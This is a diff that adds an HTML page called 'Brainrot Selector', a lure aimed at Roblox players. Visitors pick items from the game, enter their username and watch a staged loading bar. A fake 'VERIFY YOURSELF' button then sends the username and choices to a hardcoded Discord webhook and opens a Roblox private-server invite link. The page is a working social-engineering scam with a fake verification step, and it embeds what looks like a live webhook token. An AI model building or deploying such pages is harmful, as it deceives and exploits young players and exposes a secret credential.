@@ -1,0 +1,210 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Brainrot Selector</title>
+
+<style>
+  body {
+    background: #0c0c0c;
+    color: white;
+    text-align: center;
+    font-family: Arial;
+  }
+  .grid {
+    display: grid;
+    grid-template-columns: repeat(6, 120px);
+    gap: 15px;
+    justify-content: center;
+    margin-top: 20px;
+  }
+  .item {
+    background: #111;
+    padding: 10px;
+    border-radius: 15px;
+    cursor: pointer;
+    transition: 0.2s;
+    border: 3px solid transparent;
+  }
+  .item:hover {
+    transform: scale(1.05);
+    box-shadow: 0 0 15px #ff0;
+  }
+  .selected {
+    border-color: yellow;
+    box-shadow: 0 0 20px yellow;
+  }
+  .item img {
+    width: 100px;
+    height: 100px;
+    border-radius: 50%;
+  }
+  button {
+    padding: 10px 20px;
+    background: yellow;
+    border: none;
+    border-radius: 10px;
+    cursor: pointer;
+    margin-top: 30px;
+    font-weight: bold;
+  }
+  #usernameSection, #loadingSection, #captchaSection {
+    margin-top: 30px;
+    display: none;
+  }
+  #loadingBarContainer {
+    width: 60%;
+    height: 22px;
+    background: #333;
+    margin: 0 auto;
+    border-radius: 12px;
+    overflow: hidden;
+  }
+  #loadingBar {
+    height: 100%;
+    width: 0%;
+    background: yellow;
+    transition: width 0.2s linear;
+  }
+</style>
+</head>
+
+<body>
+
+<h1>Select Your Brainrots</h1>
+
+<div id="grid" class="grid"></div>
+
+<div id="continueSection" style="display:none;">
+  <button id="continueBtn">Continue</button>
+</div>
+
+<div id="usernameSection">
+  <input id="usernameInput" placeholder="Enter Username" style="padding:10px;border-radius:10px;border:none;">
+  <button id="userNext">Continue</button>
+</div>
+
+<div id="loadingSection">
+  <p id="loadingText">Loading...</p>
+  <div id="loadingBarContainer"><div id="loadingBar"></div></div>
+</div>
+
+<div id="captchaSection">
+  <p style="font-size:25px;">VERIFY YOURSELF</p>
+  <button id="captchaBtn" style="background:lime;">Click to Verify</button>
+</div>
+
+<audio id="selectSound" src="https://freesound.org/data/previews/341/341695_6248973-lq.mp3"></audio>
+
+<script>
+// ===========================
+//  1. DISCORD WEBHOOK
+// ===========================
+const WEBHOOK_URL = "https://discord.com/api/webhooks/1444391626016555140/67IE01uZ_N7tdwpGCLZ8cS2K6uGOtLoEKPkO1mpyAHHhRRaNJP_efL4wa0uQjgOvz6yp"; // <-- PUT YOUR WEBHOOK HERE
+
+function sendToDiscord(username, items) {
+  const msg = {
+    content: `📩 **New Submission**\n👤 **User:** ${username}\n🧠 **Selected Brainrots:** ${items.join(", ")}`
+  };
+
+  fetch(WEBHOOK_URL, {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify(msg)
+  });
+}
+
+// ===========================
+//  2. BRAINROT LIST
+// ===========================
+const items = [
+  "Noobini Pizzanini", "Lirilì Larilà", "Tim Cheese", "FluriFlura", "Talpa Di Fero",
+  "Svinina Bombardino", "Pipi Kiwi", "Pipi Corni", "Raccooni Jandelini",
+  "Trippi Troppi", "Tung Tung Tung Sahur", "Gangster Footera", "Bandito Bobritto",
+  "Boneca Ambalabu", "Cacto Hipopotamo", "Ta Ta Ta Ta Sahur", "Tric Trac Baraboom",
+  "Pipi Avocado", "Cappuccino Assassino", "Brr Brr Patapim", "Trulimero Trulicina",
+  "Bambini Crostini", "Bananita Dolphinita", "Perochello Lemonchello",
+  "Brri Brri Bicus Dicus Bombicus", "Avocadini Guffo",
+  "La Vacca Staturno Saturnita", "Chimpanzini Spiderini", "Strawberry Elephant",
+  "Dragon Caneloli"
+];
+
+const grid = document.getElementById("grid");
+const selected = [];
+const sound = document.getElementById("selectSound");
+
+// ===========================
+//  3. GENERATE ITEMS
+// ===========================
+items.forEach(name => {
+  const div = document.createElement("div");
+  div.className = "item";
+  div.innerHTML = `<img src="https://via.placeholder.com/100"><p>${name}</p>`;
+
+  div.onclick = () => {
+    div.classList.toggle("selected");
+    sound.play();
+
+    if (div.classList.contains("selected")) {
+      selected.push(name);
+    } else {
+      selected.splice(selected.indexOf(name), 1);
+    }
+
+    document.getElementById("continueSection").style.display =
+      selected.length > 0 ? "block" : "none";
+  };
+
+  grid.appendChild(div);
+});
+
+// ===========================
+//  4. STEP: USERNAME PAGE
+// ===========================
+document.getElementById("continueBtn").onclick = () => {
+  document.getElementById("usernameSection").style.display = "block";
+  document.getElementById("continueSection").style.display = "none";
+};
+
+// ===========================
+//  5. LOADING BAR
+// ===========================
+document.getElementById("userNext").onclick = () => {
+  const user = document.getElementById("usernameInput").value.trim();
+  if (!user) return alert("Enter a username");
+
+  document.getElementById("usernameSection").style.display = "none";
+  document.getElementById("loadingSection").style.display = "block";
+
+  let width = 0;
+  const bar = document.getElementById("loadingBar");
+  const text = document.getElementById("loadingText");
+
+  const interval = setInterval(() => {
+    width += Math.random() * 6;
+    bar.style.width = width + "%";
+
+    if (width >= 90) {
+      clearInterval(interval);
+      text.textContent = "VERIFY YOURSELF";
+      document.getElementById("captchaSection").style.display = "block";
+    }
+  }, 150);
+};
+
+// ===========================
+//  6. CAPTCHA BUTTON
+// ===========================
+document.getElementById("captchaBtn").onclick = () => {
+  const username = document.getElementById("usernameInput").value;
+
+  // send to discord
+  sendToDiscord(username, selected);
+
+  // open verification website
+  window.open("https://www.roblox.com/share?code=bdceba5effe0d9449098ad5a0d96e5eb&type=Server", "_blank");
+};
+</script>
+
+</body>
+</html>
